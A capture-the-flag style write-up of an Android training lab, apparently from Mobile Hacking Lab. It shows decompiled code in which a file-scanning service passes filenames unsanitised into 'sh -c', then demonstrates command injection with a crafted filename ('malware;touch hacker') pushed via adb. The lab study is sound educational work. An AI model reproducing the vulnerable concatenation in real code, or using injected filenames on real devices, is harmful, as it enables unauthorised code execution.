# Cyclic Scanner

This lab focuses on achieving Remote Code Execution (RCE) through a vulnerable Android service. A service is an Android component that runs in the background, without using the UI, it's for things like scanning files, playing music, or syncing data while the app isn't even open.

<p align="center">
  <img width="220" alt="logo" src="https://github.com/user-attachments/assets/22054f72-b7c4-4631-8592-5eb2ae255324" />
</p>

<p align="center">
  <a href="https://academy.mobilehackinglab.com/course/lab-cyclic-scanner">
    <img src="https://img.shields.io/badge/View%20the%20Lab-blue?style=for-the-badge" alt="View the Lab" />
  </a>
</p>

## Static Analysis

When we open the manifest with JADX, we find the service that is responsible for the scan:

```xml
<service
    android:name="com.mobilehackinglab.cyclicscanner.scanner.ScanService"
    android:exported="false"/>
```

And as we see, the exported is false, so it can't be used easily. So we need to go to the `ScanService` to see how we can manipulate it or exploit it.

To do this we need to see what triggers the scan service, so we need to look in the main activity. Looking through the functions, we find that the one responsible is:

```java
private final void startService() {
    Toast.makeText(this, "Scan service started", 0).show();
    startForegroundService(new Intent(this, (Class<?>) ScanService.class));
}
```

So that points us to `ScanService.class`.

Opening `ScanService`, we find its `handleMessage()` function:

```java

public void handleMessage(Message msg) {

    Intrinsics.checkNotNullParameter(msg, "msg");

    try {

        System.out.println((Object) "starting file scan...");

        File externalStorageDirectory = Environment.getExternalStorageDirectory();

        Intrinsics.checkNotNullExpressionValue(externalStorageDirectory, "getExternalStorageDirectory(...)");

        Sequence $this$forEach$iv = FilesKt.walk$default(externalStorageDirectory, null, 1, null);

        for (Object element$iv : $this$forEach$iv) {

            File file = (File) element$iv;

            if (file.canRead() && file.isFile()) {

                System.out.print((Object) (file.getAbsolutePath() + "..."));

                boolean safe = ScanEngine.INSTANCE.scanFile(file);

                System.out.println((Object) (safe ? "SAFE" : "INFECTED"));

            }

        }

        System.out.println((Object) "finished file scan!");

    } catch (InterruptedException e) {

        Thread.currentThread().interrupt();

    }

    ...

}

```

`Environment.getExternalStorageDirectory()` gets the device's external storage  this is what you see as `/sdcard`. From there, `FilesKt.walk$default(...)` goes through every file and folder inside it.

Let's break down the condition that decides what gets scanned:

```java

if (file.canRead() && file.isFile()) {

```

Two things need to be true for a file to get scanned:

- `file.canRead()` the app must actually have permission to read this file.

- `file.isFile()` the entry must be a real file, not a folder.

If both are true, it calls `ScanEngine.scanFile(file)` — this is what's actually doing the "scanning."

Looking into `ScanEngine`, we find the `scanFile` function:

```java
public final boolean scanFile(File file) {
    Intrinsics.checkNotNullParameter(file, "file");
    try {
        String command = "toybox sha1sum " + file.getAbsolutePath();
        Process process = new ProcessBuilder(new String[0]).command("sh", "-c", command).directory(Environment.getExternalStorageDirectory()).redirectErrorStream(true).start();
        InputStream inputStream = process.getInputStream();
        Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");
        Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
        BufferedReader bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
        try {
            BufferedReader reader = bufferedReader;
            String output = reader.readLine();
            Intrinsics.checkNotNull(output);
            Object fileHash = StringsKt.substringBefore$default(output, "  ", (String) null, 2, (Object) null);
            Unit unit = Unit.INSTANCE;
            CloseableKt.closeFinally(bufferedReader, null);
            return !ScanEngine.KNOWN_MALWARE_SAMPLES.containsValue(fileHash);
        } finally {
        }
    } catch (Exception e) {
        e.printStackTrace();
        return false;
    }
}
```

Let's break this down.

```java
String command = "toybox sha1sum " + file.getAbsolutePath();
```

This line builds a command as plain text. `toybox sha1sum` is a tool that calculates a file's hash that's how the app decides if a file is known malware. The problem is that the file's full path, which includes its name, just gets added to this text with no checks at all.

```java
Process process = new ProcessBuilder(new String[0]).command("sh", "-c", command)...
```

This line takes that text and hands it to a real shell (`sh -c`) to run. The shell doesn't just see the filename as plain text, it reads it as part of the command itself. So if the filename contains a special character like `;`, the shell treats everything after it as a brand new command.

That means if we control the filename, we control part of what actually gets executed.

Now that we understand exactly how the vulnerability works, we have everything we need to exploit it.


## Exploitation

As we saw, we just need to create a file with a malicious name, push it to the phone, and trigger the scan.

**Step 1 Create the file**

```bash
touch "malware;touch hacker"
```

The filename itself is the payload. `malware` is just a normal-looking name, but the `;` breaks out of the intended command, and `touch hacker` is our injected command it just creates an empty file called `hacker`, which we'll use as proof the injection worked.

**Step 2 Push it to the device**

```bash
adb push "malware;touch hacker" /sdcard/
```

**Step 3 Trigger the scan**

Open the app and turn on the scan service switch. This makes `ScanService` walk through `/sdcard`, find our file, and run `scanFile()` on it which builds and executes our injected command.

Here's the scan switch being turned on:

<p align="center">
  <img width="220" alt="Scan switch enabled" src="https://github.com/user-attachments/assets/83968a72-b293-4c88-acc7-11fb3fec256c" />
</p>

**Step 4 Check the result**

```bash
adb shell ls -la /sdcard/hacker
```

If `hacker` exists, our injected command actually worked, confirming remote code execution.

And here's the proof `hacker` was created on the device, confirming our command executed:

<p align="center">
  <img width="600" alt="Confirmed RCE - hacker file created" src="https://github.com/user-attachments/assets/9da6cc6a-2629-4583-9e7d-a63b0aa31a3c" />
</p>


## Outcome

This lab showed how a normal feature, like scanning files, can turn into a serious problem when user-controlled input, like a filename, gets mixed directly into a shell command instead of being treated as plain text. Even though the service itself wasn't exported, we didn't need to reach it directly, we just needed to understand how the app's own code triggered it, and exploit what happened once it ran.

The lesson: never trust something that looks safe, like a filename, and never build a shell command by adding in anything that came from outside the app.

---

I hope this write-up was helpful. Feel free to reach out if you have any questions or feedback and if you found it useful, a star ⭐ on the repo is always appreciated!
